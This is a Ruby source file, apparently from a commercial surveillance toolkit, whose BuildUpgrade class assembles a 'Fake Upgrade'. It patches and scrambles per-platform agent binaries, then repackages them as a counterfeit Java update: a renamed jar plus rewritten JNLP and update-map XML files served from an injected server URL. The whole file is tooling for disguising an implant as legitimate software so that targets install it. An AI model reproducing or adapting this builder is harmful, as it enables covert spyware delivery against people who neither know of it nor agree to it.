#
# Fake Upgrade creation
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildUpgrade < Build

  def initialize
    super
    @platform = 'upgrade'
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      begin
        build.patch params['binary'].dup
      rescue NoLicenseError => e
        trace :warn, "Build: #{e.message}"
        # trap in case of no license for a platform
        build.clean
        next
      end
      build.scramble
      build.melt params['melt'].dup

      outs = build.outputs

      # copy the outputs in our directory
      outs.each do |o|
        FileUtils.cp(File.join(build.tmpdir, o), path(o + '_' + platform))
        @outputs << o + '_' + platform
      end

      build.clean
    end

    @outputs.delete 'version'
  end

  def melt(params)
    trace :debug, "Build: melt #{params}"

    @appname = params['appname'] || 'JavaUpgrade'

    jar_name = 'JavaUpgrade-' + @appname + '.jar'

    FileUtils.cp path('JavaUpgrade.jar'), path(jar_name)
    @outputs.delete 'JavaUpgrade.jar'
    @outputs << jar_name

    # for some reason we cannot use the internal zip library, use the system "zip -u" to update a file into the jar
    File.rename path('output_windows'), path('win') if File.exist? path('output_windows')
    @outputs.delete 'output_windows'

    CrossPlatform.exec path("zip"), "-u #{path(jar_name)} win", {:chdir => path('')} if File.exist? path('win')

    content = File.open(path('java-map-update.xml'), 'rb+') {|f| f.read}
    content.gsub! "<url>%IPA_URL%/java-1.6.0_30.xml</url>", "<url>%IPA_URL%/java-1.6.0_30-#{@appname}.xml</url>"
    File.open(path("java-map-update-#{@appname}.xml"), 'wb') {|f| f.write content}
    @outputs.delete 'java-map-update.xml'
    @outputs << "java-map-update-#{@appname}.xml"

    content = File.open(path('java-1.6.0_30.xml'), 'rb+') {|f| f.read}
    content.gsub! "%IPA_URL%/JavaUpgrade.jnlp", "%IPA_URL%/JavaUpgrade-#{@appname}.jnlp"
    File.open(path("java-1.6.0_30-#{@appname}.xml"), 'wb') {|f| f.write content}
    @outputs.delete 'java-1.6.0_30.xml'
    @outputs << "java-1.6.0_30-#{@appname}.xml"

    content = File.open(path('JavaUpgrade.jnlp'), 'rb+') {|f| f.read}
    content.gsub! "JavaUpgrade.jnlp", "JavaUpgrade-#{@appname}.jnlp"
    content.gsub! "JavaUpgrade.jar", jar_name
    File.open(path("JavaUpgrade-#{@appname}.jnlp"), 'wb') {|f| f.write content}
    @outputs.delete 'JavaUpgrade.jnlp'
    @outputs << "JavaUpgrade-#{@appname}.jnlp"

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "wb") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
